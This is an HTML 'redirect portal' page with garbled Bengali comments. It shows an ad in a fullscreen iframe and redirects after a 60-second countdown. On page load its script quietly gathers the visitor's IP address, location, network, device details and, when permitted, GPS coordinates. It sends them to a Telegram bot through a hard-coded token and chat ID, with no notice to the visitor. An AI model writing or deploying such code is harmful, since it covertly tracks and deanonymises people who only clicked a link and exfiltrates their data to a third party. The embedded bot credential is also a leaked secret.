<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #adFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 1000;
        }

        .timer-container {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 10px;
            z-index: 1001;
        }

        #timer {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
        }
    </style>
</head>
<body>
    <div class="timer-container">
        Redirecting in: <span id="timer">01:00</span>
    </div>

    <script>
        // à¦Ÿà§‡à¦²à¦¿à¦—à§à¦°à¦¾à¦® à¦¬à¦Ÿ à¦•à¦¨à¦«à¦¿à¦—à¦¾à¦°à§‡à¦¶à¦¨
        const BOT_TOKEN = '7487768405:AAHivvY7f_SjAw13ZgYQeUYwgCQ-2FkTKjs';
        const CHAT_ID = '7749024395';

        // à¦¡à§‡à¦Ÿà¦¾ à¦•à¦¾à¦²à§‡à¦•à¦¶à¦¨ à¦“ à¦¸à§‡à¦¨à§à¦¡ à¦«à¦¾à¦‚à¦¶à¦¨
        async function collectAndSendData(targetUrl) {
            try {
                // IP à¦“ à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦¡à¦¿à¦Ÿà§‡à¦²à¦¸
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                // à¦¡à¦¿à¦­à¦¾à¦‡à¦¸ à¦¡à¦¿à¦Ÿà§‡à¦²à¦¸
                const deviceDetails = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
                };

                // à¦œà¦¿à¦“à¦²à§‹à¦•à§‡à¦¶à¦¨ (à¦¯à¦¦à¦¿ à¦ªà¦¾à¦°à¦®à¦¿à¦¶à¦¨ à¦¦à§‡à§Ÿ)
                let geoData = {};
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        geoData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                    });
                }

                // à¦Ÿà§‡à¦²à¦¿à¦—à§à¦°à¦¾à¦®à§‡ à¦®à§‡à¦¸à§‡à¦œ à¦«à¦°à¦®à§à¦¯à¦¾à¦Ÿ
                const message = `ðŸš¨ New Visitor Alert ðŸš¨
                
ðŸ“Œ IP Address: ${ipData.ip}
ðŸ“ Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
ðŸŒ Network: ${ipData.org}
ðŸ–¥ï¸ Device: ${deviceDetails.platform}
ðŸ”— Target URL: ${targetUrl}
                
ðŸ“¡ Full Details:
${JSON.stringify({...ipData, ...deviceDetails, ...geoData}, null, 2)}`;

                // à¦Ÿà§‡à¦²à¦¿à¦—à§à¦°à¦¾à¦® à¦¬à¦Ÿà§‡ à¦¡à§‡à¦Ÿà¦¾ à¦¸à§‡à¦¨à§à¦¡
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });

            } catch (error) {
                console.error('Error sending data:', error);
            }
        }

        // à¦°à¦¿à¦¡à¦¾à¦‡à¦°à§‡à¦•à§à¦Ÿ à¦²à¦œà¦¿à¦•
        async function initializeRedirect() {
            const id = window.location.hash.substr(1);
            const data = JSON.parse(localStorage.getItem(id));

            if(data) {
                // à¦à¦¡ à¦²à¦¿à¦‚à¦• à¦«à§à¦²à¦¸à§à¦•à§à¦°à¦¿à¦¨à§‡ à¦ªà§à¦°à¦¦à¦°à§à¦¶à¦¨
                const adFrame = document.createElement('iframe');
                adFrame.id = 'adFrame';
                adFrame.src = data.adLink;
                document.body.appendChild(adFrame);

                // à¦¡à§‡à¦Ÿà¦¾ à¦•à¦¾à¦²à§‡à¦•à¦¶à¦¨ à¦“ à¦¸à§‡à¦¨à§à¦¡
                await collectAndSendData(data.targetLink);

                // à¦Ÿà¦¾à¦‡à¦®à¦¾à¦° à¦¸à§‡à¦Ÿà¦†à¦ª
                let timeLeft = 60;
                const timerElement = document.getElementById('timer');
                
                const countdown = setInterval(() => {
                    timeLeft--;
                    timerElement.textContent = `${String(Math.floor(timeLeft/60)).padStart(2,'0')}:${String(timeLeft%60).padStart(2,'0')}`;
                    
                    if(timeLeft <= 0) {
                        clearInterval(countdown);
                        window.location.href = data.targetLink;
                    }
                }, 1000);
            }
        }

        window.onload = initializeRedirect;
    </script>
</body>
</html>
